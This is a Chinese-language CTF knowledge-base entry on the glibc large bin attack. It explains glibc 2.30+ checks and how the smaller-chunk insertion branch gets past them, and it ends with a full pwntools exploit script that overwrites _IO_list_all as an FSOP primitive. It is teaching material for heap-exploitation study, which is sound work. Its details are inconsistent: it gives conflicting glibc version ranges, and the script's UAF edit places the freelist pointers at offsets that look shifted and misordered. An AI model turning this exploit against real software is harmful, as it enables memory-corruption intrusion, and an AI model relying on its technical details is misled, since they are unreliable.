---
title: unsorted bin → large bin attack 利用链
category: pwn
tags: [large bin attack, unsorted bin, bk_nextsize, 任意写, 堆重叠]
signals: [需要往任意地址写一个堆地址, unsorted bin 里有两个不同尺寸的大 chunk, 程序能 free 超过 0x410 的 chunk, 已泄露堆地址但没有任意写原语, 目标是一次写两个指针比如 IO_FILE 结构, 题目 libc 在 2.31 到 2.35 之间]
difficulty: hard
source: "CTF-Wiki Large Bin Attack / how2heap large_bin_attack.c"
tools: [pwntools, gdb, pwndbg, glibc-all-in-one]
updated: 2026-10-23
requires: [pwn/heap-largebin-house-of-force.md]
---

## 一、识别信号（题面长什么样）

- 题目需要**往任意地址写一个「堆地址」**（比如把 `_IO_list_all` 指向堆上伪造的 FILE，或把 `stderr` 改到可控区）。
- 能 free 出**大于 `0x410`** 的 chunk（超出 tcache 范围，`0x420`、`0x430` 是常用尺寸）。
- 能同时管理**两个不同大小**的大 chunk，且能按需 `free` / `malloc`。
- 有 UAF，能改已 free 大 chunk 的 `bk_nextsize` 字段。
- 已经泄漏了堆地址（知道 fake chunk 或目标 chunk 的位置）。
- libc 版本在 **2.31 ~ 2.35**（`unsorted bin attack` 已在 2.31 前被检查废掉）。
- 最终目标常见于 FSOP：`_IO_list_all`、`_IO_2_1_stderr_`、`stdout`。

## 二、原理

### 1. 为什么用 large bin 而不是 unsorted bin

`unsorted bin attack`（`victim->bk = target - 0x10` ⇒ `*(target+0x10) = victim`）从 2.29 起被下述检查废掉：

```c
if (__glibc_unlikely (bck->fd != victim)
    || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
    malloc_printerr ("corrupted unsorted chunks");
```

于是转向 large bin：`_int_malloc` 把 unsorted bin 的大 chunk 归入 large bin 时，会用 `fd_nextsize` / `bk_nextsize` 做**按尺寸排序的双向插入**。

### 2. 插入逻辑与「写入点」

`_int_malloc` 把 unsorted bin 里的 chunk 归入 large bin 时（`bck` 为同 bin 中第一个不小于 victim 的块）：

```c
/* victim 比现有最小块还小 —— 直接插到最前，走这个分支 */
if ((unsigned long)(size) < (unsigned long)chunksize_nomask(bck->bk)) {
    fwd = bck;
    bck = bck->bk;
    victim->fd_nextsize = fwd->fd;
    victim->bk_nextsize = fwd->fd->bk_nextsize;
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
    /*                                                    ↑ 写入点 */
}
```

`victim->bk_nextsize->fd_nextsize = victim` 等价于 **`*(bk_nextsize + 0x20) = victim`**。
把 `bk_nextsize` 改成 `target - 0x20`，就得到 **`*(target) = victim`（一个堆地址）** —— 这就是 large bin attack 的核心原语。

### 3. 2.30+ 的检查与绕过

```c
/* glibc >= 2.30 */
if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
    malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
if (bck->fd != fwd)
    malloc_printerr ("malloc(): double linked list corrupted (bk)");
```

直接篡改 `bk_nextsize` 会被 `fd_nextsize != fwd` 拦下。**绕过思路**（how2heap 的 2.35 PoC）：

1. 让 `p1`（较大）先正常进入 large bin，此时它的 `bk_nextsize` 自洽。
2. 把 `p2`（较小，仍在 unsorted bin）留着不插入。
3. 篡改 `p1->bk_nextsize = target - 0x20`。
4. 申请一个**比 `p2` 大**的块，触发 `p2` 插入 large bin。由于 `p2` 走的是「比最小块还小」的分支，**不检查 `bk_nextsize` 自洽性**，于是 `*(target) = p2`。

关键手法就是：**被篡改的 chunk 和被插入的 chunk 不是同一个**。

走的是「比最小块还小」的分支（`size < chunksize_nomask(bck->bk)`），该分支**只校验 `bck->fd`，
不校验 `bk_nextsize` 自洽**，因此篡改仍然生效。
### 4. 与已有条目 `heap-largebin-house-of-force.md` 的分工

已有条目把 **large bin attack** 与 **House of Force / House of Lore** 混在一起讲，重点在 **top chunk 与 size 域**。本篇专门讲 **large bin attack 本身**，而且强调**完整利用链**：

| 维度 | 已有条目 | 本篇 |
| --- | --- | --- |
| 泄漏 | 一笔带过 | `unsorted bin` → `main_arena` → libc 的完整步骤 |
| 构造 | 只讲「写 `target`」 | 2.30+ 的检查绕过（小尺寸分支） |
| 后续 | 无 | FSOP（`_IO_list_all` / `stderr`）、堆重叠 |
| 版本 | 2.23 / 2.31 | 覆盖 2.31 / 2.35 / 2.41 |

## 三、解题步骤

1. **泄漏 libc**：`add(0x508); add(0x80); free(0); show(0)` → `main_arena` → libc 基址。
2. **准备两个「同一 large bin」的大 chunk**：`add(0x428)`（p1，较大）、`add(0x18)`（guard）、
   `add(0x418)`（p2，较小）、`add(0x18)`（guard）—— `0x430 / 0x420` 的 chunk 落在同一 bin 索引。
3. **先把 p1 送进 large bin**：`free(p1)` → `malloc(0x438)`（比 p1 大的请求会触发插入）。
4. **`free(p2)`** → 留在 unsorted bin，**此时不要插入它**。
5. **UAF 改 `p1->bk_nextsize = target - 0x20`**。
6. **`malloc(0x438)`** 让 p2 插入 large bin → `*(target) = p2`（2.30+ 也能过）。
7. **顺着 `target` 落地数据**（伪造 `_IO_FILE` / 写 hook），再触发 FSOP 或 free。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# large bin attack · glibc 2.27 ~ 2.29（经典写法，2.30+ 需双次插入）
# 目标：往 IO_list_all 写一个堆指针（FSOP 前置）
from pwn import *

context.binary = elf = ELF('./pwn')
libc = ELF('./libc-2.27.so')
context.log_level = 'info'

io = process(elf.path)

def add(size, data=b''):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    if data:
        io.sendafter(b'data: ', data)

def edit(idx, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendafter(b'data: ', data)

def show(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'idx: ', str(idx).encode())

def free(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx).encode())

# ---------------- 1. 泄漏 libc ----------------
add(0x508)                  # 0: 大块（free 后进 unsorted bin 可泄漏）
add(0x80)                   # 1: 隔断
free(0)
show(0)
main_arena  = u64(io.recv(6).ljust(8, b'\x00'))
libc_base   = main_arena - libc.sym['main_arena']
io_list_all = libc_base + libc.sym['_IO_list_all']
log.success(f'libc = {hex(libc_base)}  _IO_list_all = {hex(io_list_all)}')

# ---------------- 2. 两个「同 large bin」的大 chunk ----------------
# 0x428 / 0x418 的 chunk size 为 0x430 / 0x420，落在同一 large bin 且 p1 > p2
add(0x428)                  # 2: p1（chunk size 0x430，较大）
add(0x18)                   # 3: guard
add(0x418)                  # 4: p2（chunk size 0x420，较小）
add(0x18)                   # 5: guard

# ---------------- 3. 把 p1 先送进 large bin ----------------
free(2)                     # p1 → unsorted bin
add(0x438)                  # 6: 申请的块比 p1 大，促成 p1 插入 large bin
# 现在：p1 已插入 large bin；p2 仍处于分配状态

# ---------------- 4. p2 进 unsorted bin，并篡改 p1->bk_nextsize ----------------
free(4)                     # p2 → unsorted bin（p1 在 large bin 中，两不干扰）
# p1 仍在 free 状态，可通过 UAF 写它的 user_ptr
edit(2, flat({
    0x10: 0,                        # fd
    0x18: 0,                        # bk
    0x20: io_list_all - 0x20,       # bk_nextsize ← 目标 - 0x20
    0x28: 0,                        # fd_nextsize
}, length=0x420, filler=b'\x00'))

# ---------------- 5. 触发第二次插入 ----------------
# 申请一个比 p2 大的块，把 p2 插进 large bin；
# 由于插入位置在"比现有最小块更小"的分支，不检查 bk_nextsize 自洽性
add(0x438)                  # 7: 这一步完成 *(io_list_all) = p2
log.success('_IO_list_all ← p2（堆地址）')

# ---------------- 6. FSOP ----------------
# io_list_all 现在指向 p2，在 p2（user_ptr = io_list_all + 0x10）里伪造 _IO_FILE_plus：
# _flags=0、_IO_write_ptr > _IO_write_base、vtable 指向合法段内表
# 伪造细节见 glibc-io-wfile-kiwi-cat.md
io.interactive()
```

## 五、常见坑 / 变体

1. **`largebin double linked list corrupted (nextsize)`（2.30+）**：`fwd->bk_nextsize->fd_nextsize != fwd` 会 abort，需走「比最小块还小」的分支。
2. **`corrupted unsorted chunks`**：`unsorted bin attack` 在 2.29+ 已废，别混用。
3. **写入的是「堆地址」而非任意值**：`*(target) = victim`，只能写受害者地址；之后还要用堆喷把该处内容填成可控数据。
4. **`target` 必须可写**：`_IO_list_all`、`stderr`、`.bss` 是常用目标；libc 的只读段会段错误。
5. **必须触发「第二次插入」**：只有把第二个大块插进 large bin 时才发生 `victim->bk_nextsize` 写入。
6. **与 `tcache` 互斥**：尺寸 ≤ `0x410` 会被 tcache 截胡，必须 `> 0x410`。
7. **`2.41+` 检查更多**：对 `fd/bk` 链表完整性校验更严，成功率下降，CTF 里已不常见。
8. **变体**：写 `mp_.tcache_bins` 使 tcache 索引越界；或配合 tcache stashing 推进到 `__free_hook`（见 `tcache-stashing-unlink.md`）。

## 六、参考来源

- [CTF-Wiki: Large Bin Attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/)
- [how2heap: large_bin_attack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c)
- [how2heap 仓库](https://github.com/shellphish/how2heap)
- [glibc 源码: malloc/malloc.c（_int_malloc 的 large bin 插入）](https://github.com/bminor/glibc/blob/master/malloc/malloc.c)
- [CTF-Wiki: Unsorted Bin Attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/)
- [evilpan: IO_FILE 与高版本 glibc 中的漏洞利用技巧](https://evilpan.com/2022/07/30/glibc-exp-tricks/)
